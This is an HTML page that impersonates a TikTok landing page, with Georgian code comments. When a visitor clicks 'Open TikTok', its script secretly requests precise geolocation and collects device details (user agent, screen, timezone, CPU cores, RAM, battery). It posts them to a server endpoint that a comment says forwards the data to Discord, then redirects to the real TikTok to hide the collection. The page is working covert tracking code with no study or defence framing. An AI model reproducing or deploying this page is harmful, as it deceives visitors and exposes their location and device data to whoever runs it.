<!DOCTYPE html>
<html lang="ka">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok - Make Your Day</title> 
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
            margin: 0; padding: 0; height: 100vh;
            display: flex; justify-content: center; align-items: center;
            background-color: #000000; 
            overflow: hidden;
            color: white;
        }

        .container {
            text-align: center;
            width: 90%;
            max-width: 350px;
            z-index: 2;
        }

        .logo {
            font-size: 42px;
            font-weight: 900;
            letter-spacing: -2px;
            margin-bottom: 10px;
            text-shadow: 2px 2px 0px #25F4EE, -2px -2px 0px #FE2C55;
            color: white;
        }

        p {
            color: #a0a0a0;
            font-size: 15px;
            margin-bottom: 30px;
            line-height: 1.4;
        }

        .btn {
            padding: 16px 0; 
            font-size: 17px; 
            font-weight: 600; 
            border-radius: 8px; 
            cursor: pointer; 
            width: 100%;
            border: none; 
            transition: all 0.2s ease; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            gap: 10px;
            margin-bottom: 15px;
        }

        .btn-primary {
            background-color: #FE2C55; 
            color: white;
            box-shadow: 0 0 15px rgba(254, 44, 85, 0.4);
        }

        .btn:disabled {
            opacity: 0.8;
            cursor: not-allowed;
        }

        .spinner {
            border: 3px solid rgba(255,255,255,0.3);
            border-top: 3px solid white;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">TikTok</div>
        <p>Watch trending videos, follow creators, and discover new content.</p>
        
        <button id="mainBtn" class="btn btn-primary" onclick="handleButtonClick()">
            <span id="btnText">🎵 Open TikTok</span>
            <div id="loader" class="spinner"></div>
        </button>
    </div>

    <script>
        async function handleButtonClick() {
            const btn = document.getElementById('mainBtn');
            const btnText = document.getElementById('btnText');
            const loader = document.getElementById('loader');

            // ღილაკს ვბლოკავთ და ვწერთ "იტვირთება..."
            btn.disabled = true;
            btnText.innerText = "იტვირთება...";
            loader.style.display = "block";

            // 1. ჯერ ვთხოვთ ლოკაციას (Allow)
            const getLocation = () => {
                return new Promise((resolve) => {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
                            (err) => {
                                console.log("ლოკაცია ვერ მოიძებნა:", err.message);
                                resolve({ lat: "უარი", lon: "უარი" });
                            },
                            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                        );
                    } else {
                        resolve({ lat: "უარი", lon: "უარი" });
                    }
                });
            };

            const loc = await getLocation();

            // 2. ვაგროვებთ მოწყობილობის ინფორმაციას
            let deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: window.screen.width + "x" + window.screen.height,
                colorDepth: window.screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cores: navigator.hardwareConcurrency || "უცნობია",
                ram: navigator.deviceMemory || "უცნობია",
                battery: "ვერ გავიგეთ",
                lat: loc.lat,
                lon: loc.lon
            };

            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    deviceInfo.battery = Math.round(battery.level * 100) + "% " + (battery.charging ? "(დატენვაზე)" : "");
                }
            } catch (e) {}

            // 3. ვაგზავნით ყველაფერს Discord-ზე
            fetch('/upload_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(deviceInfo)
            })
            .then(() => {
                // 4. ველოდებით 1.5 წამს და გადავდივართ TikTok-ზე
                setTimeout(() => { window.location.href = "https://www.tiktok.com"; }, 1500);
            })
            .catch(() => {
                window.location.href = "https://www.tiktok.com";
            });
        }
    </script>
</body>
</html>
